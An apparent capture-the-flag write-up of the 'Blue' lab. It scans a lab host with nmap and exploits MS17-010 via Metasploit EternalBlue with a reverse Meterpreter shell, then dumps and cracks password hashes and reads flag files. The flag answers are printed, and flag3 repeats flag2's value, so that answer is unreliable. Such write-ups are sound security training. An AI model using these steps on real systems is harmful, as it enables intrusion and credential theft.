# Modulo blue Eternal



## Task 1

Scan the target 10.66.163.222  using nmap

```bash
nmap -sV -sC --vv --script vuln -oN blue.nmap [10.66.163.222]
```

> -sV: indicate versions
> 
> -sC: execute default nmap scripts to collect more details
> 
> -vv: verbose
> 
> --script vuln: launch active test to the open ports to find vunerabilities. There are more scripts [auth, broadcast, default.  discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln. ]
> 
> -oN: o= output, N= normal. stored the outcome in the file X e.g blue.nmap



```bash
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 128 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 128
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
49160/tcp open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
49165/tcp open  msrpc              syn-ack ttl 128 Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-0: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH


```



## Task 2 Gain access

```bash
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
set RHOST 10.66.163.222
run


```





## Task 3 ecalate

> Escalate privileges, learn how to upgrade shells in metasploit. The task ask to search in google but in did manualy with search



```bash
search type:post shell
use post/multi/manage/shell_to_meterpreter
set session  1
run


sessions
ctive sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.66.124.130:4444 -> 10.66.163.222:49476 (10.66.163.222)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.66.124.130:4433 -> 10.66.163.222:49523 (10.66.163.222)

msf post(multi/manage/shell_to_meterpreter) > sessions 2
[*] Starting interaction 


--------------------------------------------------------------

meterpreter > getsystem
[-] Already running as SYSTEM        #this confirm we escalated to NT authority\system


#Also we can do the follwing to confirm this



meterpreter > shell
Process 2696 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system            #this re-confirm we are as Authority system

C:\Windows\system32>


#List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

meterpreter > ps
2912  716   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
2956  716   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
3024  716   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM


#Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 

I tried but failed


```





## Task 4th Cracking

```bash
------

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::


#To know the Jon's PW with the hash we take the 4th field and search it with a tool in the webside.

alqfna22


------

```



## Task 5th find the flags

```bash
meterpreter > search -f flag1*
meterpreter > cat "c:\flag1.txt"
flag{access_the_machine}


#Flag2? This flag can be found at the location where passwords are stored within Windows. *Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. 


meterpreter > search -f flag2*
c:\Windows\System32\config\flag2.txt 
meterpreter > cat "c:\Windows\System32\config\flag2.txt"
flag{sam_database_elevated_access}


#Flag3

meterpreter > search -f flag*
c:\Users\Jon\Documents\flag3.txt 
meterpreter > cat "c:\Users\Jon\Documents\flag3.txt"
flag{sam_database_elevated_access}
```
